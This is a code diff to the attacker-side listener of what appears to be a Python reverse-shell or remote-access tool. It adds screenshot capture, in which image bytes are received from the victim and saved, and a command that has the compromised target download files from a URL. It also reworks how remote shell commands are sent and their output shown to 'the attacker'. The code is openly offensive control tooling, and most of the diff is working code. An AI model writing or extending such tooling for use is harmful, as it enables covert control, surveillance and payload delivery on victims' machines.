@@ -15,6 +15,7 @@ import locale
 import command
 import constant
 import logger
+import screenshot
 
 
 LISTEN_COUNT = 1
@@ -45,6 +46,7 @@ def get_shell_cmd(path):
     @returns { boolean } iic : Is internal command?
     @returns { string } rl_cmd : Real command that the internal command
     prefex is removed.
+    @returns { string[] } params : command arguments.
     """
     got_input = False
     while not got_input:
@@ -66,7 +68,7 @@ def get_shell_cmd(path):
                 continue
         got_input = True
 
-    return (full_cmd, iic, rl_cmd)
+    return (full_cmd, iic, rl_cmd, params)
 
 def __resolve_hp():
     """Resolve host and port."""
@@ -101,36 +103,76 @@ def main():
                 logger.info(f"New target => {addr}")
                 while True:
                     # Receive shell info.
-                    path = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)
+                    data = conn.recv(constant.BUF_SIZE)
+                    # Shell info is the path.
+                    path = data.decode(constant.DECODE_TYPE)
 
-                    full_cmd, iic, rl_cmd = get_shell_cmd(path)
+                    valid_internal_cmd = False
 
-                    # Check shutdown command before receiving.
-                    if iic:
+                    while not valid_internal_cmd:
+                        full_cmd, iic, rl_cmd, params = get_shell_cmd(path)
+                        params_len = len(params)
+
                         # NOTE(jenchieh): Check possible command at this moment.
-                        if rl_cmd == command.Command.EXIT.value:
-                            logger.info("Attacker exit the target...")
-                            break
+                        if iic:
+                            # Check exit command before receiving.
+                            if rl_cmd == command.Command.EXIT.value:
+                                logger.info("Attacker exit the target...")
+                                break
+                            if rl_cmd == command.Command.DOWNLOAD.value:
+                                if params_len < 1:
+                                    logger.error("Cannot download the file without the URL...")
+                                    continue
+                        valid_internal_cmd = True
 
-                    # Send it.
+                    # Send command.
                     conn.sendall(full_cmd.encode(constant.ENCODE_TYPE))
 
-                    # Check shutdown command before receiving.
+
+                    # Check internal command.
                     if iic:
-                        # NOTE(jenchieh): Check possible command at this moment.
+                        # Check shutdown command before receiving.
                         if rl_cmd == command.Command.SHUTDOWN.value:
                             logger.info("Attacker shutdown the target...")
                             shutdown = True
                             break
+                        if rl_cmd == command.Command.SCREENSHOT.value:
+                            # Check if there are image filename argument.
+                            if params_len >= 1:
+                                ss_filename = params[0]
+                            # Use default screenshot filename.
+                            else:
+                                ss_filename = screenshot.default_screenshot_name()
 
+                            # Receive image bytes.
+                            image_bytes = conn.recv(constant.BUF_SIZE)
 
-                    if process_cmd_continue(full_cmd):
-                        continue
+                            # Save the screenshot image.
+                            f = open(ss_filename, "wb+")
+                            f.write(image_bytes)
+                            f.close()
 
-                    # Receive shell command output.
-                    outs = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)
+                            logger.info(f"Image saved! => {ss_filename}")
 
-                    print(outs)
+                        if rl_cmd == command.Command.DOWNLOAD.value:
+                            result = conn.recv(constant.BUF_SIZE)
+                            msg = result.decode(constant.DECODE_TYPE)
+
+                            logger.info(msg)
+
+                    # Check regular shell command.
+                    else:
+                        if process_cmd_continue(full_cmd):
+                            continue
+
+                        # Receive shell command result.
+                        result = conn.recv(constant.BUF_SIZE)
+
+                        # Convert to bytes[].
+                        outs = result.decode(constant.DECODE_TYPE)
+
+                        # Print out the result, so the attacker can see it.
+                        print(outs)
 
     logger.info("Exit program, done attacking.")
 
